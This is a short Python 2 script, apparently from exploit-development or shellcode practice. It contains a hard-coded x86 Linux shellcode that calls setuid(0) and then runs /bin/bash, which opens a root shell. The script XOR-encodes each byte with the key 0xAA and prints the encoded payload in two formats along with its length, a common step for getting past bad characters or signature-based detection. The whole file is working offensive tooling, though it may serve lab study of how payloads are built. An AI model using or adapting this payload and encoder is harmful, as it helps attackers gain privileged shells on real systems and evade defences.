#use python2 to work well
import os
import sys

shellcode ="\xeb\x20\x5e\x31\xc0\xb0\x17\xb3\x00\xcd\x80\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\x8d\x1e\x8d\x4e\x0a\x8d\x56\x0e\xb0\x0b\xcd\x80\xe8\xdb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43"

encoded = ""
encoded2 = ""

for x in bytearray(shellcode):
        #XOR Encoding
        y = x^0xAA
        encoded += '\\x'
        encoded += '%02x' % y
        encoded2 += '0x'
        encoded2 += '%02x,' %y

print(encoded)
print(encoded2)
print('Len : %d' % len(bytearray(shellcode)))
